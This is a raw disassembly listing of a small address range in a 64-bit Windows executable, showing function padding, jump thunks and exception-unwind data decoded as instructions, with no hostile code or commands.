   140009c60:	c2 00 00             	ret    $0x0
   140009c63:	cc                   	int3
   140009c64:	cc                   	int3
   140009c65:	cc                   	int3
   140009c66:	cc                   	int3
   140009c67:	cc                   	int3
   140009c68:	cc                   	int3
   140009c69:	cc                   	int3
   140009c6a:	cc                   	int3
   140009c6b:	cc                   	int3
   140009c6c:	cc                   	int3
   140009c6d:	cc                   	int3
   140009c6e:	cc                   	int3
   140009c6f:	cc                   	int3
   140009c70:	cc                   	int3
   140009c71:	cc                   	int3
   140009c72:	cc                   	int3
   140009c73:	cc                   	int3
   140009c74:	cc                   	int3
   140009c75:	cc                   	int3
   140009c76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140009c7d:	00 00 00 
   140009c80:	ff e0                	jmp    *%rax
   140009c82:	cc                   	int3
   140009c83:	cc                   	int3
   140009c84:	cc                   	int3
   140009c85:	cc                   	int3
   140009c86:	cc                   	int3
   140009c87:	cc                   	int3
   140009c88:	cc                   	int3
   140009c89:	cc                   	int3
   140009c8a:	cc                   	int3
   140009c8b:	cc                   	int3
   140009c8c:	cc                   	int3
   140009c8d:	cc                   	int3
   140009c8e:	cc                   	int3
   140009c8f:	cc                   	int3
   140009c90:	cc                   	int3
   140009c91:	cc                   	int3
   140009c92:	cc                   	int3
   140009c93:	cc                   	int3
   140009c94:	cc                   	int3
   140009c95:	cc                   	int3
   140009c96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140009c9d:	00 00 00 
   140009ca0:	ff 25 4a 35 00 00    	jmp    *0x354a(%rip)        # 0x14000d1f0
   140009ca6:	cc                   	int3
   140009ca7:	cc                   	int3
   140009ca8:	01 05 02 00 05 34    	add    %eax,0x34050002(%rip)        # 0x174059cb0
   140009cae:	01 00                	add    %eax,(%rax)
   140009cb0:	19 20                	sbb    %esp,(%rax)
   140009cb2:	05 00 12 34 21       	add    $0x21341200,%eax
   140009cb7:	00 12                	add    %dl,(%rdx)
   140009cb9:	01 1c 00             	add    %ebx,(%rax,%rax,1)
   140009cbc:	06                   	(bad)
   140009cbd:	50                   	push   %rax
   140009cbe:	00 00                	add    %al,(%rax)
   140009cc0:	7c 9b                	jl     0x140009c5d
   140009cc2:	00 00                	add    %al,(%rax)
   140009cc4:	d0 00                	rolb   $1,(%rax)
   140009cc6:	00 00                	add    %al,(%rax)
   140009cc8:	01 1c 0c             	add    %ebx,(%rsp,%rcx,1)
   140009ccb:	00 1c 74             	add    %bl,(%rsp,%rsi,2)
   140009cce:	08 00                	or     %al,(%rax)
   140009cd0:	1c 64                	sbb    $0x64,%al
   140009cd2:	07                   	(bad)
   140009cd3:	00 1c 54             	add    %bl,(%rsp,%rdx,2)
   140009cd6:	06                   	(bad)
   140009cd7:	00 1c 34             	add    %bl,(%rsp,%rsi,1)
   140009cda:	05 00 1c f0 1a       	add    $0x1af01c00,%eax
   140009cdf:	e0 18                	loopne 0x140009cf9
   140009ce1:	d0 16                	rclb   $1,(%rsi)
   140009ce3:	c0 19 20             	rcrb   $0x20,(%rcx)
   140009ce6:	05 00 12 34 20       	add    $0x20341200,%eax
   140009ceb:	00 12                	add    %dl,(%rdx)
   140009ced:	01 1c 00             	add    %ebx,(%rax,%rax,1)
   140009cf0:	06                   	(bad)
   140009cf1:	50                   	push   %rax
   140009cf2:	00 00                	add    %al,(%rax)
   140009cf4:	7c 9b                	jl     0x140009c91
   140009cf6:	00 00                	add    %al,(%rax)
   140009cf8:	d0 00                	rolb   $1,(%rax)
   140009cfa:	00 00                	add    %al,(%rax)
   140009cfc:	01 19                	add    %ebx,(%rcx)
   140009cfe:	0a 00                	or     (%rax),%al
   140009d00:	19 34 0f             	sbb    %esi,(%rdi,%rcx,1)
   140009d03:	00 19                	add    %bl,(%rcx)
   140009d05:	52                   	push   %rdx
   140009d06:	15 f0 13 e0 11       	adc    $0x11e013f0,%eax
   140009d0b:	d0 0f                	rorb   $1,(%rdi)
   140009d0d:	c0 0d 70 0c 60 0b 50 	rorb   $0x50,0xb600c70(%rip)        # 0x14b60a984
   140009d14:	19 2d 0a 00 1c 01    	sbb    %ebp,0x11c000a(%rip)        # 0x1411c9d24
   140009d1a:	97                   	xchg   %eax,%edi
   140009d1b:	00 0d f0 0b e0 09    	add    %cl,0x9e00bf0(%rip)        # 0x149e0a911
   140009d21:	d0 07                	rolb   $1,(%rdi)
   140009d23:	c0 05 70 04 60 03 30 	rolb   $0x30,0x3600470(%rip)        # 0x14360a19a
   140009d2a:	02 50 7c             	add    0x7c(%rax),%dl
   140009d2d:	9b                   	fwait
   140009d2e:	00 00                	add    %al,(%rax)
   140009d30:	a0 04 00 00 19 30 0b 	movabs 0x1f000b3019000004,%al
   140009d37:	00 1f 
   140009d39:	34 be                	xor    $0xbe,%al
   140009d3b:	00 1f                	add    %bl,(%rdi)
   140009d3d:	01 b4 00 10 f0 0e e0 	add    %esi,-0x1ff10ff0(%rax,%rax,1)
   140009d44:	0c d0                	or     $0xd0,%al
   140009d46:	0a c0                	or     %al,%al
   140009d48:	08 70 07             	or     %dh,0x7(%rax)
   140009d4b:	60                   	(bad)
   140009d4c:	06                   	(bad)
   140009d4d:	50                   	push   %rax
   140009d4e:	00 00                	add    %al,(%rax)
   140009d50:	7c 9b                	jl     0x140009ced
   140009d52:	00 00                	add    %al,(%rax)
   140009d54:	90                   	nop
   140009d55:	05 00 00 19 28       	add    $0x28190000,%eax
   140009d5a:	07                   	(bad)
   140009d5b:	00 17                	add    %dl,(%rdi)
   140009d5d:	34 70                	xor    $0x70,%al
   140009d5f:	00 17                	add    %dl,(%rdi)
   140009d61:	01 6a 00             	add    %ebp,0x0(%rdx)
   140009d64:	08 70 07             	or     %dh,0x7(%rax)
   140009d67:	60                   	(bad)
   140009d68:	06                   	(bad)
   140009d69:	50                   	push   %rax
   140009d6a:	00 00                	add    %al,(%rax)
   140009d6c:	7c 9b                	jl     0x140009d09
   140009d6e:	00 00                	add    %al,(%rax)
   140009d70:	40 03 00             	rex add (%rax),%eax
   140009d73:	00 19                	add    %bl,(%rcx)
   140009d75:	2f                   	(bad)
   140009d76:	07                   	(bad)
   140009d77:	00 1e                	add    %bl,(%rsi)
   140009d79:	01 88 02 09 e0 07    	add    %ecx,0x7e00902(%rax)
   140009d7f:	d0 05 c0 03 30 02    	rolb   $1,0x23003c0(%rip)        # 0x14230a145
   140009d85:	50                   	push   %rax
   140009d86:	00 00                	add    %al,(%rax)
   140009d88:	7c 9b                	jl     0x140009d25
   140009d8a:	00 00                	add    %al,(%rax)
   140009d8c:	30 14 00             	xor    %dl,(%rax,%rax,1)
   140009d8f:	00 21                	add    %ah,(%rcx)
   140009d91:	22 06                	and    (%rsi),%al
   140009d93:	00 22                	add    %ah,(%rdx)
   140009d95:	f4                   	hlt
   140009d96:	91                   	xchg   %eax,%ecx
   140009d97:	02 10                	add    (%rax),%dl
   140009d99:	74 90                	je     0x140009d2b
   140009d9b:	02 08                	add    (%rax),%cl
   140009d9d:	64 8f 02             	pop    %fs:(%rdx)
   140009da0:	c0 48 00 00          	rorb   $0x0,0x0(%rax)
   140009da4:	aa                   	stos   %al,(%rdi)
   140009da5:	49 00 00             	rex.WB add %al,(%r8)
   140009da8:	74 9d                	je     0x140009d47
   140009daa:	00 00                	add    %al,(%rax)
   140009dac:	21 00                	and    %eax,(%rax)
   140009dae:	00 00                	add    %al,(%rax)
   140009db0:	c0 48 00 00          	rorb   $0x0,0x0(%rax)
   140009db4:	aa                   	stos   %al,(%rdi)
   140009db5:	49 00 00             	rex.WB add %al,(%r8)
   140009db8:	74 9d                	je     0x140009d57
   140009dba:	00 00                	add    %al,(%rax)
   140009dbc:	01 06                	add    %eax,(%rsi)
   140009dbe:	02 00                	add    (%rax),%al
   140009dc0:	06                   	(bad)
   140009dc1:	32 02                	xor    (%rdx),%al
   140009dc3:	30 19                	xor    %bl,(%rcx)
   140009dc5:	1f                   	(bad)
   140009dc6:	05 00 0d 01 52       	add    $0x52010d00,%eax
   140009dcb:	00 06                	add    %al,(%rsi)
   140009dcd:	f0 04 e0             	lock add $0xe0,%al
   140009dd0:	02 c0                	add    %al,%al
   140009dd2:	00 00                	add    %al,(%rax)
   140009dd4:	7c 9b                	jl     0x140009d71
   140009dd6:	00 00                	add    %al,(%rax)
   140009dd8:	70 02                	jo     0x140009ddc
   140009dda:	00 00                	add    %al,(%rax)
   140009ddc:	21 28                	and    %ebp,(%rax)
   140009dde:	0a 00                	or     (%rax),%al
   140009de0:	28 d4                	sub    %dl,%ah
   140009de2:	50                   	push   %rax
   140009de3:	00 20                	add    %ah,(%rax)
   140009de5:	74 51                	je     0x140009e38
   140009de7:	00 18                	add    %bl,(%rax)
   140009de9:	64 59                	fs pop %rcx
   140009deb:	00 10                	add    %dl,(%rax)
   140009ded:	54                   	push   %rsp
   140009dee:	58                   	pop    %rax
   140009def:	00 08                	add    %cl,(%rax)
   140009df1:	34 57                	xor    $0x57,%al
   140009df3:	00 20                	add    %ah,(%rax)
   140009df5:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140009df8:	99                   	cltd
   140009df9:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140009dfc:	c4                   	(bad)
   140009dfd:	9d                   	popf
   140009dfe:	00 00                	add    %al,(%rax)
   140009e00:	21 00                	and    %eax,(%rax)
   140009e02:	00 00                	add    %al,(%rax)
   140009e04:	20 4f 00             	and    %cl,0x0(%rdi)
   140009e07:	00 99 4f 00 00 c4    	add    %bl,-0x3bffffb1(%rcx)
   140009e0d:	9d                   	popf
   140009e0e:	00 00                	add    %al,(%rax)
   140009e10:	19 13                	sbb    %edx,(%rbx)
   140009e12:	01 00                	add    %eax,(%rax)
   140009e14:	04 a2                	add    $0xa2,%al
   140009e16:	00 00                	add    %al,(%rax)
   140009e18:	7c 9b                	jl     0x140009db5
   140009e1a:	00 00                	add    %al,(%rax)
   140009e1c:	48 00 00             	rex.W add %al,(%rax)
   140009e1f:	00 21                	add    %ah,(%rcx)
   140009e21:	0e                   	(bad)
   140009e22:	04 00                	add    $0x0,%al
   140009e24:	0e                   	(bad)
   140009e25:	74 0a                	je     0x140009e31
   140009e27:	00 05 34 0d 00 e0    	add    %al,-0x1ffff2cc(%rip)        # 0x12000ab61
   140009e2d:	51                   	push   %rcx
   140009e2e:	00 00                	add    %al,(%rax)
   140009e30:	2b 52 00             	sub    0x0(%rdx),%edx
   140009e33:	00 10                	add    %dl,(%rax)
   140009e35:	9e                   	sahf
   140009e36:	00 00                	add    %al,(%rax)
   140009e38:	21 00                	and    %eax,(%rax)
   140009e3a:	00 00                	add    %al,(%rax)
   140009e3c:	e0 51                	loopne 0x140009e8f
   140009e3e:	00 00                	add    %al,(%rax)
   140009e40:	2b 52 00             	sub    0x0(%rdx),%edx
   140009e43:	00 10                	add    %dl,(%rax)
   140009e45:	9e                   	sahf
   140009e46:	00 00                	add    %al,(%rax)
   140009e48:	19 29                	sbb    %ebp,(%rcx)
   140009e4a:	09 00                	or     %eax,(%rax)
   140009e4c:	17                   	(bad)
   140009e4d:	64 2d 00 17 54 2c    	fs sub $0x2c541700,%eax
   140009e53:	00 17                	add    %dl,(%rdi)
   140009e55:	34 2b                	xor    $0x2b,%al
   140009e57:	00 17                	add    %dl,(%rdi)
   140009e59:	01 28                	add    %ebp,(%rax)
   140009e5b:	00 10                	add    %dl,(%rax)
   140009e5d:	70 00                	jo     0x140009e5f
   140009e5f:	00 7c 9b 00          	add    %bh,0x0(%rbx,%rbx,4)
   140009e63:	00 30                	add    %dh,(%rax)
   140009e65:	01 00                	add    %eax,(%rax)
   140009e67:	00 19                	add    %bl,(%rcx)
   140009e69:	1a 04 00             	sbb    (%rax,%rax,1),%al
   140009e6c:	0b 01                	or     (%rcx),%eax
   140009e6e:	11 00                	adc    %eax,(%rax)
   140009e70:	04 e0                	add    $0xe0,%al
   140009e72:	02 50 7c             	add    0x7c(%rax),%dl
   140009e75:	9b                   	fwait
   140009e76:	00 00                	add    %al,(%rax)
   140009e78:	68 00 00 00 21       	push   $0x21000000
   140009e7d:	08 02                	or     %al,(%rdx)
   140009e7f:	00 08                	add    %cl,(%rax)
   140009e81:	34 14                	xor    $0x14,%al
   140009e83:	00 80 54 00 00 f2    	add    %al,-0xdffffac(%rax)
   140009e89:	54                   	push   %rsp
   140009e8a:	00 00                	add    %al,(%rax)
   140009e8c:	68 9e 00 00 21       	push   $0x2100009e
   140009e91:	cb                   	lret
   140009e92:	0a 00                	or     (%rax),%al
   140009e94:	cb                   	lret
   140009e95:	64 15 00 24 f4 0e    	fs adc $0xef42400,%eax
   140009e9b:	00 19                	add    %bl,(%rcx)
   140009e9d:	d4                   	(bad)
   140009e9e:	0f 00 12             	lldt   (%rdx)
   140009ea1:	c4                   	(bad)
   140009ea2:	10 00                	adc    %al,(%rax)
   140009ea4:	08 74 16 00          	or     %dh,0x0(%rsi,%rdx,1)
   140009ea8:	f2 54                	repnz push %rsp
   140009eaa:	00 00                	add    %al,(%rax)
   140009eac:	a5                   	movsl  (%rsi),(%rdi)
   140009ead:	55                   	push   %rbp
   140009eae:	00 00                	add    %al,(%rax)
   140009eb0:	7c 9e                	jl     0x140009e50
   140009eb2:	00 00                	add    %al,(%rax)
   140009eb4:	21 00                	and    %eax,(%rax)
   140009eb6:	00 00                	add    %al,(%rax)
   140009eb8:	f2 54                	repnz push %rsp
   140009eba:	00 00                	add    %al,(%rax)
   140009ebc:	a5                   	movsl  (%rsi),(%rdi)
   140009ebd:	55                   	push   %rbp
   140009ebe:	00 00                	add    %al,(%rax)
   140009ec0:	7c 9e                	jl     0x140009e60
   140009ec2:	00 00                	add    %al,(%rax)
   140009ec4:	21 00                	and    %eax,(%rax)
   140009ec6:	0a 00                	or     (%rax),%al
   140009ec8:	00 f4                	add    %dh,%ah
   140009eca:	0e                   	(bad)
   140009ecb:	00 00                	add    %al,(%rax)
   140009ecd:	d4                   	(bad)
   140009ece:	0f 00 00             	sldt   (%rax)
   140009ed1:	c4                   	(bad)
   140009ed2:	10 00                	adc    %al,(%rax)
   140009ed4:	00 74 16 00          	add    %dh,0x0(%rsi,%rdx,1)
   140009ed8:	00 64 15 00          	add    %ah,0x0(%rbp,%rdx,1)
   140009edc:	f2 54                	repnz push %rsp
   140009ede:	00 00                	add    %al,(%rax)
   140009ee0:	a5                   	movsl  (%rsi),(%rdi)
   140009ee1:	55                   	push   %rbp
   140009ee2:	00 00                	add    %al,(%rax)
   140009ee4:	7c 9e                	jl     0x140009e84
   140009ee6:	00 00                	add    %al,(%rax)
   140009ee8:	21 00                	and    %eax,(%rax)
   140009eea:	08 00                	or     %al,(%rax)
   140009eec:	00 f4                	add    %dh,%ah
   140009eee:	0e                   	(bad)
   140009eef:	00 00                	add    %al,(%rax)
   140009ef1:	d4                   	(bad)
   140009ef2:	0f 00 00             	sldt   (%rax)
   140009ef5:	c4                   	(bad)
   140009ef6:	10 00                	adc    %al,(%rax)
   140009ef8:	00 74 16 00          	add    %dh,0x0(%rsi,%rdx,1)
   140009efc:	f2 54                	repnz push %rsp
   140009efe:	00 00                	add    %al,(%rax)
   140009f00:	a5                   	movsl  (%rsi),(%rdi)
   140009f01:	55                   	push   %rbp
   140009f02:	00 00                	add    %al,(%rax)
   140009f04:	7c 9e                	jl     0x140009ea4
   140009f06:	00 00                	add    %al,(%rax)
   140009f08:	21 00                	and    %eax,(%rax)
   140009f0a:	00 00                	add    %al,(%rax)
   140009f0c:	80 54 00 00 f2       	adcb   $0xf2,0x0(%rax,%rax,1)
   140009f11:	54                   	push   %rsp
   140009f12:	00 00                	add    %al,(%rax)
   140009f14:	68 9e 00 00 01       	push   $0x100009e
   140009f19:	0f 06                	clts
   140009f1b:	00 0f                	add    %cl,(%rdi)
   140009f1d:	74 03                	je     0x140009f22
   140009f1f:	00 0a                	add    %cl,(%rdx)
   140009f21:	64 02 00             	add    %fs:(%rax),%al
   140009f24:	05 34 01 00 01       	add    $0x1000134,%eax
   140009f29:	15 08 00 15 74       	adc    $0x74150008,%eax
   140009f2e:	08 00                	or     %al,(%rax)
   140009f30:	15 64 07 00 15       	adc    $0x15000764,%eax
   140009f35:	34 06                	xor    $0x6,%al
   140009f37:	00 15 32 11 e0 19    	add    %dl,0x19e01132(%rip)        # 0x159e0b06f
   140009f3d:	1f                   	(bad)
   140009f3e:	06                   	(bad)
   140009f3f:	00 10                	add    %dl,(%rax)
   140009f41:	f2 09 f0             	repnz or %esi,%eax
   140009f44:	07                   	(bad)
   140009f45:	e0 05                	loopne 0x140009f4c
   140009f47:	d0 03                	rolb   $1,(%rbx)
   140009f49:	60                   	(bad)
   140009f4a:	02 50 7c             	add    0x7c(%rax),%dl
   140009f4d:	9b                   	fwait
   140009f4e:	00 00                	add    %al,(%rax)
   140009f50:	60                   	(bad)
   140009f51:	00 00                	add    %al,(%rax)
   140009f53:	00 21                	add    %ah,(%rcx)
   140009f55:	1a 06                	sbb    (%rsi),%al
   140009f57:	00 1a                	add    %bl,(%rdx)
   140009f59:	c4                   	(bad)
   140009f5a:	0e                   	(bad)
   140009f5b:	00 11                	add    %dl,(%rcx)
   140009f5d:	74 0f                	je     0x140009f6e
   140009f5f:	00 08                	add    %cl,(%rax)
   140009f61:	34 16                	xor    $0x16,%al
   140009f63:	00 10                	add    %dl,(%rax)
   140009f65:	74 00                	je     0x140009f67
   140009f67:	00 4d 74             	add    %cl,0x74(%rbp)
   140009f6a:	00 00                	add    %al,(%rax)
   140009f6c:	3c 9f                	cmp    $0x9f,%al
   140009f6e:	00 00                	add    %al,(%rax)
   140009f70:	21 00                	and    %eax,(%rax)
   140009f72:	00 00                	add    %al,(%rax)
   140009f74:	10 74 00 00          	adc    %dh,0x0(%rax,%rax,1)
   140009f78:	4d 74 00             	rex.WRB je 0x140009f7b
   140009f7b:	00 3c 9f             	add    %bh,(%rdi,%rbx,4)
   140009f7e:	00 00                	add    %al,(%rax)
   140009f80:	19 38                	sbb    %edi,(%rax)
   140009f82:	0d 00 27 74 91       	or     $0x91742700,%eax
   140009f87:	00 27                	add    %ah,(%rdi)
   140009f89:	64 90                	fs nop
   140009f8b:	00 27                	add    %ah,(%rdi)
   140009f8d:	34 8f                	xor    $0x8f,%al
   140009f8f:	00 27                	add    %ah,(%rdi)
   140009f91:	01 88 00 18 f0 16    	add    %ecx,0x16f01800(%rax)
   140009f97:	e0 14                	loopne 0x140009fad
   140009f99:	d0 12                	rclb   $1,(%rdx)
   140009f9b:	c0 10 50             	rclb   $0x50,(%rax)
   140009f9e:	00 00                	add    %al,(%rax)
   140009fa0:	7c 9b                	jl     0x140009f3d
   140009fa2:	00 00                	add    %al,(%rax)
   140009fa4:	30 04 00             	xor    %al,(%rax,%rax,1)
   140009fa7:	00 19                	add    %bl,(%rcx)
   140009fa9:	1d 05 00 0b 01       	sbb    $0x10b0005,%eax
   140009fae:	26 00 04 70          	es add %al,(%rax,%rsi,2)
   140009fb2:	03 60 02             	add    0x2(%rax),%esp
   140009fb5:	30 00                	xor    %al,(%rax)
   140009fb7:	00 7c 9b 00          	add    %bh,0x0(%rbx,%rbx,4)
   140009fbb:	00 10                	add    %dl,(%rax)
   140009fbd:	01 00                	add    %eax,(%rax)
   140009fbf:	00 21                	add    %ah,(%rcx)
   140009fc1:	60                   	(bad)
   140009fc2:	0a 00                	or     (%rax),%al
   140009fc4:	60                   	(bad)
   140009fc5:	f4                   	hlt
   140009fc6:	24 00                	and    $0x0,%al
   140009fc8:	43 e4 25             	rex.XB in $0x25,%al
   140009fcb:	00 30                	add    %dh,(%rax)
   140009fcd:	d4                   	(bad)
   140009fce:	2d 00 1b c4 2c       	sub    $0x2cc41b00,%eax
   140009fd3:	00 08                	add    %cl,(%rax)
   140009fd5:	54                   	push   %rsp
   140009fd6:	2b 00                	sub    (%rax),%eax
   140009fd8:	b0 8d                	mov    $0x8d,%al
   140009fda:	00 00                	add    %al,(%rax)
   140009fdc:	7d 8e                	jge    0x140009f6c
   140009fde:	00 00                	add    %al,(%rax)
   140009fe0:	a8 9f                	test   $0x9f,%al
   140009fe2:	00 00                	add    %al,(%rax)
   140009fe4:	21 00                	and    %eax,(%rax)
   140009fe6:	00 00                	add    %al,(%rax)
   140009fe8:	b0 8d                	mov    $0x8d,%al
   140009fea:	00 00                	add    %al,(%rax)
   140009fec:	7d 8e                	jge    0x140009f7c
   140009fee:	00 00                	add    %al,(%rax)
   140009ff0:	a8 9f                	test   $0x9f,%al
   140009ff2:	00 00                	add    %al,(%rax)
   140009ff4:	19 2c 0b             	sbb    %ebp,(%rbx,%rcx,1)
   140009ff7:	00 1e                	add    %bl,(%rsi)
   140009ff9:	64 23 00             	and    %fs:(%rax),%eax
   140009ffc:	1e                   	(bad)
   140009ffd:	34 22                	xor    $0x22,%al
   140009fff:	00 1e                	add    %bl,(%rsi)
   14000a001:	01 1a                	add    %ebx,(%rdx)
   14000a003:	00 12                	add    %dl,(%rdx)
   14000a005:	f0 10 e0             	lock adc %ah,%al
   14000a008:	0e                   	(bad)
   14000a009:	c0 0c 70 0b          	rorb   $0xb,(%rax,%rsi,2)
   14000a00d:	50                   	push   %rax
   14000a00e:	00 00                	add    %al,(%rax)
   14000a010:	7c 9b                	jl     0x140009fad
   14000a012:	00 00                	add    %al,(%rax)
   14000a014:	c0 00 00             	rolb   $0x0,(%rax)
   14000a017:	00 01                	add    %al,(%rcx)
   14000a019:	0a 04 00             	or     (%rax,%rax,1),%al
   14000a01c:	0a 34 07             	or     (%rdi,%rax,1),%dh
   14000a01f:	00 0a                	add    %cl,(%rdx)
   14000a021:	32 06                	xor    (%rsi),%al
   14000a023:	60                   	(bad)
   14000a024:	21 05 02 00 05 74    	and    %eax,0x74050002(%rip)        # 0x1b405a02c
   14000a02a:	06                   	(bad)
   14000a02b:	00 70 98             	add    %dh,-0x68(%rax)
   14000a02e:	00 00                	add    %al,(%rax)
   14000a030:	84 98 00 00 18 a0    	test   %bl,-0x5fe80000(%rax)
   14000a036:	00 00                	add    %al,(%rax)
   14000a038:	21 00                	and    %eax,(%rax)
   14000a03a:	00 00                	add    %al,(%rax)
   14000a03c:	70 98                	jo     0x140009fd6
   14000a03e:	00 00                	add    %al,(%rax)
   14000a040:	84 98 00 00 18 a0    	test   %bl,-0x5fe80000(%rax)
   14000a046:	00 00                	add    %al,(%rax)
   14000a048:	01 00                	add    %eax,(%rax)
   14000a04a:	00 00                	add    %al,(%rax)
   14000a04c:	01 09                	add    %ecx,(%rcx)
   14000a04e:	01 00                	add    %eax,(%rax)
   14000a050:	09 62 00             	or     %esp,0x0(%rdx)
   14000a053:	00 01                	add    %al,(%rcx)
   14000a055:	08 04 00             	or     %al,(%rax,%rax,1)
   14000a058:	08 72 04             	or     %dh,0x4(%rdx)
   14000a05b:	70 03                	jo     0x14000a060
   14000a05d:	60                   	(bad)
   14000a05e:	02 30                	add    (%rax),%dh
   14000a060:	01 02                	add    %eax,(%rdx)
   14000a062:	01 00                	add    %eax,(%rax)
   14000a064:	02 30                	add    (%rax),%dh
   14000a066:	00 00                	add    %al,(%rax)
   14000a068:	01 04 01             	add    %eax,(%rcx,%rax,1)
   14000a06b:	00 04 42             	add    %al,(%rdx,%rax,2)
   14000a06e:	00 00                	add    %al,(%rax)
   14000a070:	01 04 01             	add    %eax,(%rcx,%rax,1)
   14000a073:	00 04 12             	add    %al,(%rdx,%rdx,1)
   14000a076:	00 00                	add    %al,(%rax)
   14000a078:	01 00                	add    %eax,(%rax)
   14000a07a:	00 00                	add    %al,(%rax)
   14000a07c:	00 00                	add    %al,(%rax)
   14000a07e:	00 00                	add    %al,(%rax)
   14000a080:	01 00                	add    %eax,(%rax)
	...
